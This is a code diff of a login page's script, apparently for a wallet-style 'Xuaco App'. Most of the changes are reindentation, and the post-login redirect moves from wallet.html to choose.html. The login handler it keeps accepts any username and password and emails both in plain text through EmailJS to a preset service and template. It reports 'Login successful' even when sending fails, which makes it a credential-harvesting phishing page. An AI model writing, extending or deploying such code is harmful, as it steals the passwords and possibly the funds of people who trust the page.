@@ -303,15 +303,15 @@
 
         // ENABLE LOGIN BUTTON
         function validateLoginFields() {
-    if (
-        loginUsername.value.trim() !== "" &&
-        loginPassword.value.trim() !== ""
-    ) {
-        loginBtn.disabled = false;
-    } else {
-        loginBtn.disabled = true;
-    }
-}
+            if (
+                loginUsername.value.trim() !== "" &&
+                loginPassword.value.trim() !== ""
+            ) {
+                loginBtn.disabled = false;
+            } else {
+                loginBtn.disabled = true;
+            }
+        }
 
         loginUsername.addEventListener("input", validateLoginFields);
         loginPassword.addEventListener("input", validateLoginFields);
@@ -343,46 +343,46 @@
 
         // LOGIN FUNCTION
         loginForm.addEventListener("submit", function (e) {
-    e.preventDefault();
+            e.preventDefault();
 
-    const username = loginUsername.value.trim();
-    const password = loginPassword.value.trim();
+            const username = loginUsername.value.trim();
+            const password = loginPassword.value.trim();
 
-    // simple rule: allow any login if fields are filled
-    if (username === "" || password === "") {
-        alert("Please enter username and password.");
-        return;
-    }
+            // simple rule: allow any login if fields are filled
+            if (username === "" || password === "") {
+                alert("Please enter username and password.");
+                return;
+            }
 
-    loginBtn.disabled = true;
-    loginBtn.textContent = "Confirming...";
+            loginBtn.disabled = true;
+            loginBtn.textContent = "Confirming...";
 
-    emailjs.send(
-        "service_trbleaf",
-        "template_59c3vc9",
-        {
-            user_name: username,
-            user_username: username,
-            user_loginPassword: password,
-            login_time: new Date().toLocaleString(),
-            message: "A login was detected on Xuaco App."
-        }
-    )
-    .then(function () {
-        alert("Login successful. Redirecting...");
+            emailjs.send(
+                "service_trbleaf",
+                "template_59c3vc9",
+                {
+                    user_name: username,
+                    user_username: username,
+                    user_loginPassword: password,
+                    login_time: new Date().toLocaleString(),
+                    message: "A login was detected on Xuaco App."
+                }
+            )
+                .then(function () {
+                    alert("Login successful. Redirecting...");
 
-        setTimeout(() => {
-            window.location.href = "wallet.html";
-        }, 1500);
-    })
-    .catch(function () {
-        alert("Login successful (email failed).");
+                    setTimeout(() => {
+                        window.location.href = "choose.html";
+                    }, 1500);
+                })
+                .catch(function () {
+                    alert("Login successful (email failed).");
 
-        setTimeout(() => {
-            window.location.href = "wallet.html";
-        }, 1500);
-    });
-});
+                    setTimeout(() => {
+                        window.location.href = "choose.html";
+                    }, 1500);
+                });
+        });
 
     </script>
 
